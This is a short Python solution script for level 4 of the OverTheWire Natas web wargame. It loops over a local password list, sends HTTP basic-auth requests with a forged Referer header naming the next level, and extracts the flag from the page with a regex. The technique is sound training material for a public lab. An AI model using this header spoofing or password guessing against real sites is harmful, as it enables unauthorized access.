#!/usr/bin/env python


import requests
import re

from pathlib import Path
from bs4 import BeautifulSoup, Comment


password_file = Path('../passwords.txt')


level = 4
username = '%s%s' % ('natas', level)
passwords = open(password_file, 'r').readlines()

# found directory by checking the hint:
# 'Not even google can find this'
# robots.txt

url = 'http://%s.natas.labs.overthewire.org/' % username

if __name__ == '__main__':

    # Read passwords and enforce bruteforce
    for password in passwords:

        password = password.strip()

        # Add additional referer header
        header = {
            'referer': 'http://natas5.natas.labs.overthewire.org/'
        }

        # Pass the username and password to request
        http = requests.post(url, auth=(username, password), headers=header)

        if http.status_code != 200:
            pass

        else:
            # Create a BS parser
            soup = BeautifulSoup(http.text, 'html.parser')

            # Get all comments in the html using anonymous function
            # result = soup.find_all(string=lambda text: isinstance(text))

            # Get the div element with id name content and convert it to text
            result = soup.select('#content')[0].text

            # Get the exact match using a pattern and print
            flag = re.search(r'[a-zA-Z0-9]{32,}', result).group(0)

            print(flag)

            # Save the flag
            with open('flag.txt', 'w') as out:
                out.write(flag)

            out.close()

            break
